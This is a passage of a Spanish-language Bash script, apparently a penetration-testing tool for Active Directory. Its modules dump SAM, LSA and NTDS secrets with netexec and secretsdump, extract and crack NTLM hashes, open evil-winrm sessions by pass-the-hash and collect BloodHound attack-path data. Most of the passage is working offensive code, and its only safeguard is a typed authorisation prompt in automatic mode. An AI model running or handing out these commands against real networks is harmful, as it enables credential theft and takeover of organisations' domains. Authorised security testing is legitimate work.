# ─── MÓDULO 5: Movimiento lateral ─────────────────────────────────────────────
module_lateral() {
    section "MÓDULO 5 — Movimiento lateral"
    report_section "5. Movimiento lateral"

    if [[ -z "$TARGET_USER" ]]; then
        warn "No hay credenciales configuradas. Saltando módulo 5."
        return 0
    fi

    # --- Verificar acceso admin ---
    if check_tool netexec; then
        info "Verificando acceso administrativo SMB..."
        run_nxc_smb | tee "$OUTPUT_DIR/lateral/nxc_admin_check.txt"

        local is_admin
        is_admin=$(grep -c "Pwn3d!" "$OUTPUT_DIR/lateral/nxc_admin_check.txt" 2>/dev/null || echo 0)

        if [[ "$is_admin" -gt 0 ]]; then
            ok "¡Acceso de ADMINISTRADOR confirmado! (Pwn3d!)"
            report_add "> ⚠️ **Acceso administrativo confirmado en $TARGET_IP**"

            warn "Dumpeando SAM..."
            run_nxc_smb --sam | tee "$OUTPUT_DIR/lateral/sam_dump.txt"
            report_code "SAM Dump" "$OUTPUT_DIR/lateral/sam_dump.txt"

            warn "Dumpeando LSA secrets..."
            run_nxc_smb --lsa | tee "$OUTPUT_DIR/lateral/lsa_dump.txt"
            report_code "LSA Secrets" "$OUTPUT_DIR/lateral/lsa_dump.txt"

            warn "Dumpeando NTDS (Domain Controller)..."
            run_nxc_smb --ntds 2>/dev/null | tee "$OUTPUT_DIR/lateral/ntds_dump.txt"
            report_code "NTDS Dump" "$OUTPUT_DIR/lateral/ntds_dump.txt"

            # Crackear hashes NTLM del SAM/NTDS automáticamente
            if [[ -s "$OUTPUT_DIR/lateral/sam_dump.txt" ]]; then
                grep -oP '[0-9a-f]{32}:[0-9a-f]{32}' "$OUTPUT_DIR/lateral/sam_dump.txt" \
                    > "$OUTPUT_DIR/cracking/sam_hashes.txt" 2>/dev/null || true
                [[ -s "$OUTPUT_DIR/cracking/sam_hashes.txt" ]] \
                    && module_crack_hashes "$OUTPUT_DIR/cracking/sam_hashes.txt" "1000" "NTLM_SAM"
            fi
        else
            info "Sin privilegios de administrador en $TARGET_IP"
        fi

        # Verificar WinRM
        info "Verificando acceso WinRM (5985)..."
        run_nxc_smb --port 5985 2>/dev/null \
            | grep -i "winrm\|5985" \
            | tee "$OUTPUT_DIR/lateral/winrm_check.txt" || true
    fi

    # --- Secretsdump ---
    local sd_cmd
    sd_cmd=$(find_impacket "secretsdump")
    if [[ -n "$sd_cmd" ]]; then
        info "Ejecutando secretsdump..."
        if [[ -n "$TARGET_HASH" ]]; then
            $sd_cmd "$TARGET_DOMAIN/$TARGET_USER@$TARGET_IP" \
                -hashes ":$TARGET_HASH" \
                -outputfile "$OUTPUT_DIR/lateral/secretsdump" 2>/dev/null \
                | tee "$OUTPUT_DIR/lateral/secretsdump_output.txt"
        else
            $sd_cmd "$TARGET_DOMAIN/$TARGET_USER:$TARGET_PASS@$TARGET_IP" \
                -outputfile "$OUTPUT_DIR/lateral/secretsdump" 2>/dev/null \
                | tee "$OUTPUT_DIR/lateral/secretsdump_output.txt"
        fi
        report_code "Secretsdump" "$OUTPUT_DIR/lateral/secretsdump_output.txt"
    fi

    # --- Evil-WinRM ---
    if check_tool evil-winrm; then
        info "Comprobando conectividad WinRM en $TARGET_IP:5985..."
        if nc -z -w3 "$TARGET_IP" 5985 2>/dev/null; then
            ok "Puerto 5985 abierto — WinRM disponible"
            echo -e "${YELLOW}[!] Abriendo sesión Evil-WinRM interactiva.${RESET}"
            echo -e "${DIM}    Escribe 'exit' para volver al menú de auditoría.${RESET}"
            if [[ -n "$TARGET_HASH" ]]; then
                evil-winrm -i "$TARGET_IP" -u "$TARGET_USER" -H "$TARGET_HASH" || warn "Evil-WinRM falló"
            else
                evil-winrm -i "$TARGET_IP" -u "$TARGET_USER" -p "$TARGET_PASS" || warn "Evil-WinRM falló"
            fi
        else
            warn "Puerto 5985 cerrado — WinRM no disponible en $TARGET_IP"
        fi
    fi

    ok "Módulo 5 completado → $OUTPUT_DIR/lateral/"
}

# ─── MÓDULO 6: BloodHound ────────────────────────────────────────────────────
module_bloodhound() {
    section "MÓDULO 6 — BloodHound / Análisis de rutas de ataque"
    report_section "6. BloodHound"

    if [[ -z "$TARGET_USER" ]]; then
        warn "BloodHound requiere credenciales. Saltando módulo 6."
        return 0
    fi

    local bh_cmd=""
    command -v bloodhound-python &>/dev/null && bh_cmd="bloodhound-python"
    command -v bloodhound.py    &>/dev/null && bh_cmd="bloodhound.py"

    if [[ -n "$bh_cmd" ]]; then
        info "Recolectando datos BloodHound (colección: All)..."
        mkdir -p "$OUTPUT_DIR/bloodhound"
        pushd "$OUTPUT_DIR/bloodhound" > /dev/null || return 1

        if [[ -n "$TARGET_HASH" ]]; then
            $bh_cmd -u "$TARGET_USER" --hashes ":$TARGET_HASH" \
                -d "$TARGET_DOMAIN" -ns "$TARGET_IP" \
                -c All --zip 2>/dev/null | tee "bh_collection.log"
        else
            $bh_cmd -u "$TARGET_USER" -p "$TARGET_PASS" \
                -d "$TARGET_DOMAIN" -ns "$TARGET_IP" \
                -c All --zip 2>/dev/null | tee "bh_collection.log"
        fi

        popd > /dev/null || return 1

        local bh_zip
        bh_zip=$(ls "$OUTPUT_DIR/bloodhound/"*.zip 2>/dev/null | head -1 || echo "")
        if [[ -n "$bh_zip" ]]; then
            ok "Datos BloodHound recolectados → $bh_zip"
            report_add "BloodHound ZIP generado: \`$bh_zip\`. Importar en la GUI."
        else
            warn "No se generaron ficheros BloodHound"
        fi
    else
        warn "bloodhound-python no encontrado"
        echo -e "    ${DIM}→ pip install bloodhound${RESET}"
    fi

    # Instrucciones neo4j / GUI
    echo -e "\n${CYAN}[i]${RESET} ${BOLD}Pasos para analizar en BloodHound:${RESET}"
    echo -e "    1. ${BOLD}sudo neo4j console${RESET}  (primera vez: cambia creds en http://localhost:7474)"
    echo -e "    2. ${BOLD}bloodhound &${RESET}  — Login con las creds de neo4j"
    echo -e "    3. Importa el ZIP de: ${BOLD}$OUTPUT_DIR/bloodhound/${RESET}"
    echo -e "\n    ${BOLD}Consultas útiles:${RESET}"
    echo -e "    • Find Shortest Paths to Domain Admins"
    echo -e "    • Find AS-REP Roastable Users"
    echo -e "    • List all Kerberoastable Accounts"
    echo -e "    • Find Computers where Domain Users are Local Admin"
    echo -e "    • Shortest Path from Kerberoastable Users to Domain Admins"

    ok "Módulo 6 completado → $OUTPUT_DIR/bloodhound/"
}

# ─── Informe final ────────────────────────────────────────────────────────────
generate_report() {
    section "Generando informe consolidado"

    local end_time duration mins secs
    end_time=$(date +%s)
    duration=$((end_time - START_TIME))
    mins=$((duration / 60))
    secs=$((duration % 60))

    cat >> "$REPORT_FILE" << MDEOF

---

## Resumen de la auditoría

| Campo         | Valor                              |
|---------------|------------------------------------|
| Target        | \`$TARGET_IP\`                     |
| Dominio       | \`$TARGET_DOMAIN\`                 |
| Usuario       | ${TARGET_USER:-anónimo}            |
| Duración      | ${mins}m ${secs}s                  |
| Fecha fin     | $(date '+%Y-%m-%d %H:%M:%S')       |

### Artefactos generados

\`\`\`
$(find "$OUTPUT_DIR" -type f | sort 2>/dev/null)
\`\`\`

---
*Informe generado por AD-Audit.sh v2.0 — Sr.Robot Labs*
MDEOF

    ok "Informe consolidado → ${BOLD}$REPORT_FILE${RESET}"
    echo -e "${DIM}Duración total: ${mins}m ${secs}s${RESET}"
}

# ─── Modo automático ──────────────────────────────────────────────────────────
mode_auto() {
    echo -e "${RED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════╗"
    echo "  ║  MODO AUTOMÁTICO — Todas las fases en secuencia  ║"
    echo "  ║  Asegúrate de tener AUTORIZACIÓN ESCRITA         ║"
    echo "  ╚══════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo -ne "${YELLOW}[?] Confirmar que tienes autorización (escribe exactamente 'si'): ${RESET}"
    read -r confirm
    [[ "$confirm" != "si" ]] && { info "Operación cancelada."; return 0; }

    module_anon_enum
    module_creds_enum
    module_kerberos
    module_lateral
    module_bloodhound
    generate_report

    echo -e "\n${GREEN}${BOLD}╔══════════════════════════════════════╗"
    echo      "║  ✓ Auditoría completada              ║"
    echo      "╚══════════════════════════════════════╝${RESET}"
    echo -e "  Resultados: ${BOLD}$OUTPUT_DIR/${RESET}"
    echo -e "  Informe:    ${BOLD}$REPORT_FILE${RESET}"
    echo -e "  Log:        ${BOLD}$LOG_FILE${RESET}"
}

# ─── Menú principal ───────────────────────────────────────────────────────────
main_menu() {
    while true; do
        banner
        if [[ -n "$TARGET_IP" ]]; then
            echo -e "  ${DIM}Target: $TARGET_IP | $TARGET_DOMAIN | ${TARGET_USER:-anónimo}${RESET}\n"
        fi

        echo -e "  ${BOLD}${CYAN}MENÚ PRINCIPAL${RESET}\n"
        echo -e "  ${BOLD}[0]${RESET} ⚙️  Configurar target"
        echo -e "  ${BOLD}[c]${RESET} 🔍 Verificar herramientas instaladas"
        echo -e "  ${BOLD}[1]${RESET} 👤 Enumeración anónima / sin credenciales"
        echo -e "  ${BOLD}[2]${RESET} 🔑 Enumeración con credenciales + LDAP profundo"
        echo -e "  ${BOLD}[3]${RESET} 🎫 Kerberoasting / AS-REP Roasting"
        echo -e "  ${BOLD}[4]${RESET} 🔓 Cracking de hashes (hashcat / john)"
        echo -e "  ${BOLD}[5]${RESET} 🔄 Movimiento lateral (pass-the-hash, evil-winrm)"
        echo -e "  ${BOLD}[6]${RESET} 🩸 BloodHound / rutas de ataque"
        echo -e "  ${BOLD}[7]${RESET} ${YELLOW}⚡ Modo automático (todos los módulos)${RESET}"
        echo -e "  ${BOLD}[8]${RESET} 📄 Generar informe final"
        echo -e "  ${BOLD}[q]${RESET} 🚪 Salir\n"
        echo -ne "  ${CYAN}Selección > ${RESET}"
        read -r opt

        # Verificar que OUTPUT_DIR esté configurado antes de ejecutar módulos
        _require_config() {
            if [[ -z "$OUTPUT_DIR" ]]; then
                warn "Primero configura el target [0]"
                pause
                return 1
            fi
            return 0
        }

        case "$opt" in
            0) setup_config ;;
            c) check_all_tools ;;
            1) _require_config && { module_anon_enum; pause; } ;;
            2) _require_config && { module_creds_enum; pause; } ;;
            3) _require_config && { module_kerberos; pause; } ;;
            4) _require_config && { module_crack_hashes; pause; } ;;
            5) _require_config && { module_lateral; pause; } ;;
            6) _require_config && { module_bloodhound; pause; } ;;
            7) _require_config && { mode_auto; pause; } ;;
            8) if [[ -z "$OUTPUT_DIR" ]]; then
                   err "Primero configura el target [0]"; pause
               else
                   generate_report; pause
               fi ;;
            q|Q|exit|quit)
               echo -e "\n${DIM}Sesión cerrada. Sr.Robot Labs — que el dominio caiga.${RESET}\n"
               exit 0 ;;
            *) err "Opción no válida: '$opt'" ;;
        esac
    done
}

# ─── Punto de entrada ─────────────────────────────────────────────────────────
usage() {
    cat << HELPEOF
Uso: $0 [OPCIÓN]

Opciones:
  (sin argumentos)   Menú interactivo
  --auto             Modo automático: ejecuta todos los módulos en secuencia
  --check            Solo verifica herramientas instaladas
  -h, --help         Muestra esta ayuda

Ejemplos:
  $0                                    # menú interactivo
  $0 --auto                             # auditoría completa automatizada
  $0 --check                            # verificar dependencias

HELPEOF
    exit 0
}

case "${1:-}" in
    -h|--help)  usage ;;
    --check)    banner; check_all_tools; exit 0 ;;
    --auto)     banner; setup_config && mode_auto ;;
    "")         main_menu ;;
    *)          err "Argumento desconocido: '$1'"; usage ;;
esac
